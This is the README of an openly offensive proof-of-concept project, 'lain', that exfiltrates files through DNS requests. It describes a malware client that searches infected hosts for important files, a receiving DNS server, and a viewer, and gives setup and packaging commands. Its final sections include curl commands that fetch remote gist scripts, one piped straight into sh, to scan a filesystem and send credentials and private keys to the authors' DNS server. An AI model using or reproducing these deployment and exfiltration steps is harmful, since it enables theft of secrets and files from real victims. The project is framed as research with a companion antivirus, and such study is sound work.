# lain 

This project contains a proof of concept for a data exfiltration method that operates by leaking data through DNS requests. This can be used as a component for any malware that needs a communication channel to export sensitive files. For technical and implementation details, please see the included paper.

* The `client` folder contains the code for a prototype malware client that searches an infected host for important files. It uses our communication infrastructure to leak these files through DNS requests.
* The `dns` folder contains our own custom fork of the `dnspython` library, which we use to form the DNS requests on the client side.
* The `dns_server` folder contains our custom DNS server that listens for incoming requests structured using to our custom request format and logs them in a database for later reconstruction.
* The `lib` folder contains code that handles the encoding and packet structuring when breaking apart the files for transit as well as the code for reconstructing them on the server side. This folder also contains utility code for logging and querying the database.
* The `web_interface` folder contains a demonstrative interface for viewing the data chunks logged in the database and allows for the reconstructed data to be visualized.

The accompanying antivirus can be found [here](https://github.com/CrMallard/Antibody)

## Setup
The DNS server has been tested on `Debian 9.4 x64` please expect different results if you do not use that specific distribution of Linux. The underlying implementation of DNS is different for different distros that we tested. Debian is the one we optimized for.

This project requires Python `>=3.5`. We have no guarantees for any other versions or distributions.

### Custom DNS Server
Make sure you have `sqlite3` installed on your computer.
```
pip install -r requirements.txt
sudo python dns_server/malware_server.py # sudo is required to use port 53
```

### Running the Web Server
Make sure you have `sqlite3` installed on your computer.
```
pip install -r requirements.txt
cd web_interface
export FLASK_APP=app.py
flask run --host=0.0.0.0
```

### Packaging Malware and Running Distribution Server
Make sure you are running a distribution of Linux. Install `pyinstaller`. Run the following command.
```
chmod +x package_malware.sh
./package_malware.sh
cd dist
python -m SimpleHTTPServer
```

Now, with the Custom DNS server running, the Web Server running, and the Distribution Server running, you are ready to go.
You can change the bash scripts `infect.sh` and `one_file.sh` to point to your IP address instead of our default one.


### Exfiltrating a file example (will send to our default DNS server)
```
curl https://gist.githubusercontent.com/ColdSauce/a1ff11090994bd6e0c6731dcb407ba7a/raw/9d1456301d493dde762aa0aa7e6cac16e6da6e37/one_file.sh > one_file.sh
chmod +x one_file.sh
./one_file.sh <full path to file you would like to extract>
```

### Scanning entire file system and exfiltrating credentials and private keys
```
curl https://gist.githubusercontent.com/ColdSauce/c65f8d70da7ff04246d5da53534995f5/raw/9b191bbccf99d3da22064b87cd7130404e813442/infect.sh | sh
```

## Authors
* Alvin Lin (omgimanerd)
* Stefan Aleksic (ColdSauce)
* Chris Remillard (CrMallard)
